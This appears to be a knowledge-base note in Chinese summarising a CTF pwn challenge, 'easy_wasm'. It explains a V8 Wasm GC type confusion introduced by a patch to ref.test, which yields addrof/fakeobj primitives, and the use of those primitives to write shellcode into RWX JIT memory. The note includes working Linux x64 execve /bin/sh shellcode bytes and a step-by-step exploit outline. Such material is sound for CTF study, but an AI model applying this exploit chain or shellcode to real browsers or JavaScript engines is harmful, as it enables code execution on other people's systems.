---
title: 京麒 easy_wasm — V8 Wasm 沙箱绕过与 Shellcode 执行
category: pwn
tags: [v8, wasm, jit, shellcode, sandbox-bypass, type-confusion]
triggers: [京麒CTF, easy_wasm, V8 Wasm, Wasm沙箱, ref.test, Wasm GC, --no-memory-protection-keys, Gift函数, addrof, fakeobj, JIT code]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/pwn/Jinqi-easy_wasm-V8-Wasm-Sandbox-Bypass.md]
---

## Summary

V8 Wasm GC 沙箱绕过。利用 `ref.test` 子类型检查 bug（Patch 后允许类型混淆）实现 `addrof`/`fakeobj` 原语，最终将 shellcode 写入 RWX 的 JIT code 区域。

## Key Points

### 编译配置（关键保护关闭）
```
v8_enable_sandbox=false       # 沙箱关闭
--no-memory-protection-keys   # 内存保护密钥禁用
```

### 攻击原语

| 原语 | 实现方式 |
|------|---------|
| `Gift(wasmFunc)` | 返回函数 JIT code 的 BigInt 地址 |
| `addrof(obj)` | Wasm struct 的 ref 字段存对象 + i64 字段读地址 |
| `fakeobj(addr)` | Wasm struct 的 i64 字段写地址 + ref 字段读为对象 |
| Shellcode 写入 | ArrayBuffer DataView → RWX JIT code 区域 |

### Wasm Struct 层级与类型混淆
```
Base { a: i32 }
Mid1 extends Base { a: i32 }
Mid2 extends Mid1 { a: i32 }
Mid3 extends Mid2 { a: i32 }
RefType extends Mid3 { a: externref }
I64Type extends Mid3 { a: i64 }

# Patch: ref.test 跳转从 no_match → match
ref.test(RefType, I64Type) → true 允许 reinterpret
```

### 利用流程
1. `Gift(wasmFunc)` 泄露 JIT code 地址
2. `addrof(dataView)` 获取 DataView 对象地址
3. `fakeobj(dataViewAddr)` 伪造对象 → 写入 shellcode 字节
4. 调用 wasm 函数 → 执行 RWX 区域 shellcode

### Shellcode（Linux x64 execve /bin/sh）
```python
shellcode = [
    0x48, 0x31, 0xF6, 0x56, 0x48, 0xBF, 0x2F, 0x62,
    0x69, 0x6E, 0x2F, 0x2F, 0x73, 0x68, 0x57, 0x48,
    0x89, 0xE7, 0x48, 0x31, 0xD2, 0x48, 0x31, 0xC0,
    0xB0, 0x3B, 0x0F, 0x05
]
```

### 服务端交互
1. 发送 script size（≤102400）
2. 发送 JavaScript exploit 脚本
3. d8 执行：`/home/ctf/d8 --no-memory-protection-keys <script>`

## Connections
- Related: [[skill-heap-techniques]] (V8 相关技术)
- Related: [[skill-advanced-exploits]] (沙箱逃逸)
